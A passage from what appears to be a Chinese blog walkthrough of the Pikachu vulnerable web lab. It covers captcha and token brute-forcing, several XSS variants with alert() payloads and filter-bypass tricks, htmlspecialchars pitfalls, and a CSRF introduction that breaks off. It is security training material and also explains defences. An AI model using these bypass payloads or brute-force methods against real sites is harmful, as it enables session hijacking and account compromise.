<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> code; <span class="comment">//在全局 定义验证码</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createCode</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> codeLength = <span class="number">5</span>;<span class="comment">//验证码的长度</span></span><br><span class="line">        <span class="keyword">var</span> checkCode = <span class="built_in">document</span>.getElementById(<span class="string">&quot;checkCode&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> selectChar = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>);<span class="comment">//所有候选组成验证码的字符，当然也可以用中文的</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; codeLength; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> charIndex = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">36</span>);</span><br><span class="line">            code += selectChar[charIndex];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//alert(code);</span></span><br><span class="line">        <span class="keyword">if</span> (checkCode) &#123;</span><br><span class="line">            checkCode.className = <span class="string">&quot;code&quot;</span>;</span><br><span class="line">            checkCode.value = code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> inputCode = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#bf_client .vcode&#x27;</span>).value;</span><br><span class="line">        <span class="keyword">if</span> (inputCode.length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            alert(<span class="string">&quot;请输入验证码！&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (inputCode != code) &#123;</span><br><span class="line">            alert(<span class="string">&quot;验证码输入错误！&quot;</span>);</span><br><span class="line">            createCode();<span class="comment">//刷新验证码</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    createCode();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Token防爆破"><a href="#Token防爆破" class="headerlink" title="Token防爆破"></a>Token防爆破</h2><p>抓包发现有 token</p>
<p><img src="/2021/04/28/pikachu/3.jpg"></p>
<p>Repeater后可以看到返回包里有新的 token，即下一次登陆要使用的 token 值在此次登陆的返回包里，而且是明文传输，所以爆破时一定是单线程。</p>
<p><img src="/2021/04/28/pikachu/4.jpg"></p>
<p>intruder模块：设置Grep Extract</p>
<p><img src="/2021/04/28/pikachu/5.jpg"></p>
<p>设置线程为1</p>
<p><img src="/2021/04/28/pikachu/6.jpg"></p>
<p><img src="/2021/04/28/pikachu/7.jpg"></p>
<p>添加返回包里的 token 值，有效载荷选递归搜索</p>
<p><img src="/2021/04/28/pikachu/9.jpg"></p>
<p>成功爆破</p>
<p><img src="/2021/04/28/pikachu/8.jpg"></p>
<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>对XSS的熟悉程度取决于对浏览器机制和HTML、JS的了解程度。这部分涉及内容较多，需要多加练习。</p>
<h2 id="反射型XSS-get"><a href="#反射型XSS-get" class="headerlink" title="反射型XSS(get)"></a>反射型XSS(get)</h2><p>比较好绕过，F12更改输入框maxlength，或者直接在URL中补全&lt;/script&gt;即可。js代码正确即可被浏览器执行。</p>
<p><img src="/2021/04/28/pikachu/10.jpg"></p>
<h2 id="反射型XSS-post"><a href="#反射型XSS-post" class="headerlink" title="反射型XSS(post)"></a>反射型XSS(post)</h2><p>此处同上，只不过URL不显示</p>
<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>注入语句会写入数据库中，每次进入都会执行</p>
<p>同上</p>
<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>DOM: Document Object Model文档对象模型，DOM型XSS是一种特殊类型的反射型XSS。</p>
<p>当网页到达浏览器，浏览器会为网页创建一个Document object文档对象，然后生成各个子文档对象，其中<strong>每个页面元素对应一个文档对象</strong>，每个文档对象包含属性、方法和事件。</p>
<p>我们可以通过JS脚本对文档对象进行编辑从而修改页面的元素。<strong>客户端脚本程序可以通过DOM来动态修改页面内容，客户端获取DOM中的数据并在本地执行</strong>。基于此，JS脚本就可以用来实现XSS。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;xssd_main&quot;</span>&gt;</span><br><span class="line">               &lt;script&gt;</span><br><span class="line">                   <span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                       <span class="keyword">var</span> str = <span class="built_in">document</span>.getElementById(<span class="string">&quot;text&quot;</span>).value;</span><br><span class="line">                       <span class="built_in">document</span>.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                   <span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br><span class="line">                   <span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span><br><span class="line">               &lt;/script&gt;</span><br><span class="line">               &lt;!--<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>--&gt;</span></span><br><span class="line"><span class="xml">               <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">               <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;click me!&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;domxss()&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">               <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;dom&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">           <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>通过 getElementById 获取到了标签 Id 为 text的内容赋值给str</p>
<p>  然后又把 str 的内容通过字符串拼接的方式写到了 a 标签的 href 属性中，而a标签会写到<strong>Id 为 dom</strong>的 div 标签中。</p>
<p>因此通过闭合的方式构造Payload</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=alert(&quot;xss&quot;)&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/28/pikachu/11.jpg"></p>
<p>DOM型XSS不经过后台交互，前端输入被DOM给获取，通过DOM又在前端输出</p>
<h2 id="DOM型XSS-X"><a href="#DOM型XSS-X" class="headerlink" title="DOM型XSS-X"></a>DOM型XSS-X</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;xssd_main&quot;</span>&gt;</span><br><span class="line">                &lt;script&gt;</span><br><span class="line">                    <span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                        <span class="keyword">var</span> str = <span class="built_in">window</span>.location.search;</span><br><span class="line">                        <span class="keyword">var</span> txss = <span class="built_in">decodeURIComponent</span>(str.split(<span class="string">&quot;text=&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">                        <span class="keyword">var</span> xss = txss.replace(<span class="regexp">/\+/g</span>,<span class="string">&#x27; &#x27;</span>);</span><br><span class="line"><span class="comment">//                        alert(xss);</span></span><br><span class="line"></span><br><span class="line">                        <span class="built_in">document</span>.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+xss+<span class="string">&quot;&#x27;&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br><span class="line">                    <span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span><br><span class="line">                &lt;/script&gt;</span><br><span class="line">                &lt;!--<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>--&gt;</span></span><br><span class="line">                &lt;form method=&quot;get&quot;&gt;</span><br><span class="line">                &lt;input id=&quot;text&quot; name=&quot;text&quot; type=&quot;text&quot;  value=&quot;&quot; /&gt;</span><br><span class="line">                &lt;input id=&quot;submit&quot; type=&quot;submit&quot; value=&quot;请说出你的伤心往事&quot;/&gt;</span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;dom&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>首先定义一个domxss函数：</p>
<p>利用 window.location.search 获取浏览器中URL的内容，然后赋值给 str</p>
<p>然后经过URL解码和字符串分隔，取出URL中的参数内容；</p>
<p>把 “+” 替换为 “ ”（空格），赋值给 xss；</p>
<p>把 xss 拼接到 a 标签中，然后写到 Id 为 dom 的 div 标签中。</p>
<p>与之前DOM不同的是，它的输入是从浏览器的URL中获取的，很像反射型XSS(get)</p>
<p>构造的Payload同上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;alert(&quot;xss&quot;)&gt;</span><br></pre></td></tr></table></figure>

<h2 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h2><p>为攻击场景，输入的内容不会在当前输出，而是提交到后台。若输入一串js，管理员登录后台管理界面，后台会输出我们提交的内容</p>
<p>输入常见xss一句话，登陆管理员界面即可看到一登陆进来就遭受攻击。</p>
<h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><p>常见xss一句话输入，被后台过滤，大小写即可绕过。也可用&lt;img src=x onerror=alert(‘xss’)&gt;。</p>
<p>实际场景中，或多或少都会有过滤，但是有些逻辑不严谨，也可被绕过。</p>
<p>绕过思路：</p>
<ul>
<li><strong>前端限制绕过</strong>：直接抓包重放，或修改html前端代码。如反射型XSS(get)中限制输入20个字符。</li>
<li><strong>大小写</strong>：比如<SCRIPT>aLeRT(111)。后台可能用正则表达式匹配，如果正则里面只匹配小写，那就可能被绕过。</SCRIPT></li>
<li><strong>双写</strong>：&lt;scri<script>pt>alert(111)</scri</script>pt&gt;。针对后台把<script>标签去掉换，但可能只去掉一次。</li>
<li><strong>注释干扰</strong>：&lt;scri<!--test-->pt&gt;alert(111)&lt;/sc<!--test-->ript&gt;。加上注释后可能可以绕过后台过滤机制。</li>
<li><strong>编码</strong>：后台过滤特殊字符，如<script>标签，但该标签可被各种编码，或许可以绕过。(浏览器会对某些编码进行识别，翻译成正常的标签执行)</li>
</ul>
<blockquote>
<h5 id="浏览器的解码顺序："><a href="#浏览器的解码顺序：" class="headerlink" title="浏览器的解码顺序："></a><strong>浏览器的解码顺序：</strong></h5><p>浏览器的解码顺序和解析顺序不同。浏览器一般的解码顺序是：html解码–&gt;javascript解码–&gt;浏览器的url解码.</p>
<p>这里的url解码和发送到服务器的url解码不同，那个过程是由服务器来完成的，而不是浏览器。</p>
</blockquote>
<p> <strong>属性标签不会正常解析URL编码，因此不会执行</strong></p>
<blockquote>
<p>&lt;img src=x onerror=alert(‘xss’)&gt;</p>
<p>将alert(‘xss’)进行URL编码，可以执行吗？</p>
<img src=x onerror=alert%28%27xss%27%29>
</blockquote>
<p><strong>HTML编码可以被浏览器解析，因此会执行</strong></p>
<blockquote>
<p>&lt;img src=x onerror=alert(‘xss’)&gt;将alert(‘xss’)进行HTML编码<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x78;&#x73;&#x73;&#x27;&#x29;></p>
</blockquote>
<h2 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h2><p>htmlspecialchars()：<strong>对特殊字符进行转义</strong></p>
<p>  预定义字符包括：</p>
<ul>
<li><p>&amp; 成为 &amp;amp</p>
</li>
<li><p>“ 成为 &amp;quot</p>
</li>
<li><p>‘ 成为 &amp;#039</p>
</li>
<li><p>&lt; 成为 &amp;lt</p>
</li>
<li><p>&gt; 成为 &amp;gt</p>
<p>可用引号类型</p>
</li>
<li><p>ENT_COMPAT：默认，仅编码双引号</p>
</li>
<li><p>ENT_QUOTES：编码双引号和单引号</p>
</li>
<li><p>ENT_NOQUOTES：不编码任何引号</p>
</li>
</ul>
<blockquote>
<p>默认：对输入直接进行过滤。</p>
<p>建议用ENT_QUOTES,对单双引号都进行过滤</p>
</blockquote>
<p>测试，查看htmlspecialchars是否过滤单双引号：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111&#39;&quot;&lt;&gt;&amp;</span><br></pre></td></tr></table></figure>

<p><img src="4.png"></p>
<p>可以对于单引号未进行编码，因此构造Payload:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q&#x27; onclick=&#x27;alert(111)&#x27;</span><br></pre></td></tr></table></figure>

<p>审计后端代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;输入点啥吧！&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//使用了htmlspecialchars进行处理,是不是就没问题了呢,htmlspecialchars默认不对&#x27;处理</span></span><br><span class="line">        <span class="variable">$message</span>=htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">        <span class="variable">$html1</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;你的输入已经被记录:&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">//输入的内容被处理后输出到了input标签的value属性里面,试试:&#x27; onclick=&#x27;alert(111)&#x27;</span></span><br><span class="line"><span class="comment">//        $html2.=&quot;&lt;input class=&#x27;input&#x27; type=&#x27;text&#x27; name=&#x27;inputvalue&#x27; readonly=&#x27;readonly&#x27; value=&#x27;&#123;$message&#125;&#x27; style=&#x27;margin-left:120px;display:block;background-color:#c0c0c0;border-style:none;&#x27;/&gt;&quot;;</span></span><br><span class="line">        <span class="variable">$html2</span>.=<span class="string">&quot;&lt;a href=&#x27;<span class="subst">&#123;$message&#125;</span>&#x27;&gt;<span class="subst">&#123;$message&#125;</span>&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于htmlspecialchars默认不处理’，导致可以绕过。</p>
<h2 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p>先来看看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;叫你输入个url,你咋不听?&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>] == <span class="string">&#x27;www.baidu.com&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;我靠,我真想不到你是这样的一个人&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//输出在a标签的href属性里面,可以使用javascript协议来执行js</span></span><br><span class="line">        <span class="comment">//防御:只允许http,https,其次在进行htmlspecialchars处理</span></span><br><span class="line">        <span class="variable">$message</span>=htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>],ENT_QUOTES);</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;a href=&#x27;<span class="subst">&#123;$message&#125;</span>&#x27;&gt; 阁下自己输入的url还请自己点一下吧&lt;/a&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$message=htmlspecialchars($_GET[‘message’],ENT_QUOTES) htmlspecialchars使用ENT_QUOTES，过滤掉单双引号，然后将输入放入a标签的href属性中。a标签的href属性可用javascript协议来执行js。这时候就利用js构造payload:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>思考:</p>
<p>a标签的href属性如果有输出，如何做防范措施呢？</p>
<p>首先仅仅用htmlspecialchars做过滤是不够的。一般有两个逻辑： href用来插入链接，所以我们<strong>首先只允许http,https开头的协议，再进行htmlspecialchars过滤</strong>。</p>
<h2 id="XSS之js输出"><a href="#XSS之js输出" class="headerlink" title="XSS之js输出"></a>XSS之js输出</h2><p>随便输入111，查看网页源码可以发现，输入被放入js中进行判断后输出。</p>
<p>其实<strong>js的payload就是构造闭合</strong>，</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $ms=<span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="comment">//在这构造：$ms=&#x27;1&#x27;&lt;/script&gt;&lt;script&gt;alert(111)&lt;/script&gt;&#x27;;</span></span><br><span class="line">    <span class="keyword">if</span>($ms.length != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>($ms == <span class="string">&#x27;tmac&#x27;</span>)&#123;</span><br><span class="line">            $(<span class="string">&#x27;#fromjs&#x27;</span>).text(<span class="string">&#x27;tmac确实厉害,看那小眼神..&#x27;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//            alert($ms);</span></span><br><span class="line">            $(<span class="string">&#x27;#fromjs&#x27;</span>).text(<span class="string">&#x27;无论如何不要放弃心中所爱..&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>payload为：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;&lt;/script&gt;&lt;script&gt;alert(111)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>后台源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;这里讲输入动态的生成到了js中,形成xss</span><br><span class="line">&#x2F;&#x2F;javascript里面是不会对tag和字符实体进行解释的,所以需要进行js转义</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;讲这个例子主要是为了让你明白,输出点在js中的xss问题,应该怎么修?</span><br><span class="line">&#x2F;&#x2F;这里如果进行html的实体编码,虽然可以解决XSS的问题,但是实体编码后的内容,在JS里面不会进行翻译,这样会导致前端的功能无法使用。</span><br><span class="line">&#x2F;&#x2F;所以在JS的输出点应该使用\对特殊字符进行转义</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;submit&#39;]) &amp;&amp; $_GET[&#39;message&#39;] !&#x3D;null)&#123;</span><br><span class="line">    $jsvar&#x3D;$_GET[&#39;message&#39;];</span><br><span class="line">&#x2F;&#x2F;    $jsvar&#x3D;htmlspecialchars($_GET[&#39;message&#39;],ENT_QUOTES);</span><br><span class="line">    if($jsvar &#x3D;&#x3D; &#39;tmac&#39;)&#123;</span><br><span class="line">        $html.&#x3D;&quot;&lt;img src&#x3D;&#39;&#123;$PIKA_ROOT_DIR&#125;assets&#x2F;images&#x2F;nbaplayer&#x2F;tmac.jpeg&#39; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $ms&#x3D;&#39;&lt;?php echo $jsvar;?&gt;&#39;;</span><br><span class="line">    if($ms.length !&#x3D; 0)&#123;</span><br><span class="line">        if($ms &#x3D;&#x3D; &#39;tmac&#39;)&#123;</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;tmac确实厉害,看那小眼神..&#39;)</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">&#x2F;&#x2F;            alert($ms);</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;无论如何不要放弃心中所爱..&#39;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>前端接收，后端通过js接收参数。输出点在js中，通过用户输入动态生成了js代码。使用htmlspecialchars做过滤时，输入会被html实体编码，而js不能再反转化回去。所以<strong>用\在JS中对特殊字符进行转义</strong>。</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1516371">https://cloud.tencent.com/developer/article/1516371</a></p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>攻击者会伪造一个请求链接，然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。</p>
<p>判断一个网站是否存在CSRF漏洞，其实就是<strong>判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造</strong>。</p>
<p>CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。</p>
<p>网站如果要防止CSRF攻击，需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。如：<br>–对敏感信息的操作增加安全的token；<br>–对敏感信息的操作增加安全的验证码；<br>–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p>
<h2 id="CSRF-GET"><a href="#CSRF-GET" class="headerlink" title="CSRF(GET)"></a>CSRF(GET)</h2><p>在修改个人信息处，可以看到URL以明文的形式传输，攻击者可以伪造URL诱骗用户点击来实现攻击。此处我们伪造URL将目标用户的邮箱修改为我们的邮箱。若用户在登陆的状态下点击此伪造的URL，可更改个人信息。伪造的URL如下：</p>
